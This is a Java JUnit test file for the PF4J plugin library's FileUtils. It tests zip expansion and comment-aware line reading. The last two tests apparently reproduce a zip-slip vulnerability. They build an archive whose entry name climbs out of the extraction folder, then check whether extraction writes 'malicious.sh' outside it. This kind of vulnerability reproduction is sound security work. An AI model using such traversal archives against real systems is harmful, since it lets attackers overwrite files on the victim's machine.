/*
 * Copyright (C) 2012-present the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.pf4j.util;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.pf4j.test.PluginZip;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.pf4j.util.FileUtils.expandIfZip;

public class FileUtilsTest {

    @TempDir
    Path pluginsPath;

    @Test
    public void expandIfZipForZipWithOnlyModuleDescriptor() throws Exception {
        PluginZip pluginZip = new PluginZip.Builder(pluginsPath.resolve("my-plugin-1.2.3.zip"), "myPlugin")
                .pluginVersion("1.2.3")
                .build();

        Path unzipped = FileUtils.expandIfZip(pluginZip.path());
        assertEquals(pluginZip.unzippedPath(), unzipped);
        assertTrue(Files.exists(unzipped.resolve("plugin.properties")));
    }

    @Test
    public void expandIfZipForZipWithResourceFile() throws Exception {
        PluginZip pluginZip = new PluginZip.Builder(pluginsPath.resolve("my-second-plugin-1.2.3.zip"), "myPlugin")
                .pluginVersion("1.2.3")
                .addFile(Paths.get("classes/META-INF/plugin-file"), "plugin")
                .build();

        Path unzipped = FileUtils.expandIfZip(pluginZip.path());
        assertEquals(pluginZip.unzippedPath(), unzipped);
        assertTrue(Files.exists(unzipped.resolve("classes/META-INF/plugin-file")));
    }

    @Test
    public void expandIfZipNonZipFiles() throws Exception {
        // File without .suffix
        Path extra = pluginsPath.resolve("extra");
        assertEquals(extra, FileUtils.expandIfZip(extra));

        // Folder
        Path folder = pluginsPath.resolve("folder");
        assertEquals(folder, FileUtils.expandIfZip(folder));
    }

    @Test
    public void readLinesIgnoreCommentTest() throws IOException {
        File file = createSampleFile("test");

        // ignoreComments = true
        List<String> ignoreCommentsLines = FileUtils.readLines(file.toPath(), true);
        assertEquals("1 content", ignoreCommentsLines.get(0));
        assertEquals(2, ignoreCommentsLines.size());

        // ignoreComments = false
        List<String> lines = FileUtils.readLines(file.toPath(), false);
        assertEquals("# 1 comment", lines.get(0));
        assertEquals(4, lines.size());
        file.deleteOnExit();
    }

    public File createSampleFile(String fileName) throws IOException {
        File file = File.createTempFile(fileName, ".txt");
        file.deleteOnExit();

        try (Writer writer = new OutputStreamWriter(Files.newOutputStream(file.toPath()))) {
            writer.write("# 1 comment\n");
            writer.write("1 content\n");
            writer.write("2 content\n");
            writer.write("# 2 comment\n");
        }
        return file;
    }

    /**
     * Using the zipslip vulnerability, create a zip file.
     *
     * Save the created zip file in the D:/code/pf4j directory, if you do not have this path on your computer D drive, create it
     * @throws Exception
     */
    @Test
    public void creatFile() throws Exception {

        String maliciousFileName = "../../../../../../../malicious.sh";

        // Build a malicious ZIP file
        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream("malicious.zip"))) {
            ZipEntry entry = new ZipEntry(maliciousFileName);
            zipOutputStream.putNextEntry(entry);
            zipOutputStream.write("Malicious content".getBytes());
            zipOutputStream.closeEntry();
        }
    }

    /**
     * Try to extract malicious.zip to the root directory of drive D on your computer.
     * @throws Exception
     */
    @Test
    public void loadFile() throws Exception {
        // Save the created zip file in the D:/code/pf4j directory, if you do not have this path on your computer D drive, create it
        String maliciousZipPath = "D:\\code\\pf4j\\malicious.zip";

        // Unzip file
        expandIfZip(Paths.get(maliciousZipPath));
        //loadPluginFromPath(Paths.get(maliciousZipPath));

        // Check whether the specified file exists in the directory
        File  file = new File("D:\\malicious.sh");
        if (file.exists()) {
            System.out.println("file exists: Directory traversal successful!");
        } else {
            System.out.println("file does not exist!");
        }
    }


}
